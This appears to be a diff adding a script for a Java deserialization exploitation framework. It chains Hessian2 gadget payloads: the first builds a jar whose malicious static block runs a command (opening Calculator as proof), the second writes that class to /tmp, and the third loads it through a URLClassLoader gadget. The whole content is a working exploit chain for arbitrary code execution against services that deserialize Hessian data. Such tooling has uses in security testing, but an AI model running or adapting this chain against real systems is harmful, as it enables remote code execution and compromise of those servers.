@@ -1,0 +1,23 @@
+use payload EvilFileWrapper
+use bullet ClassWithEvilStaticBlock
+set type jar
+set body "open -a Calculator.app"
+set classname EvilObj
+run
+
+use payload LazyValueForHessian
+use bullet LazyValueWithFileWrite2Bullet
+set serializeType hessian2
+set output file
+set dir /tmp
+set classname Test
+set localFile ./payload.EvilFileWrapper.ClassWithEvilStaticBlock.ser
+run
+
+use payload LazyValueForHessian
+use bullet SwingLazyValueWithUrlClassLoaderBullet
+set serializeType hessian2
+set output file
+set filepath /tmp/Test.class
+set evilClass EvilObj
+run
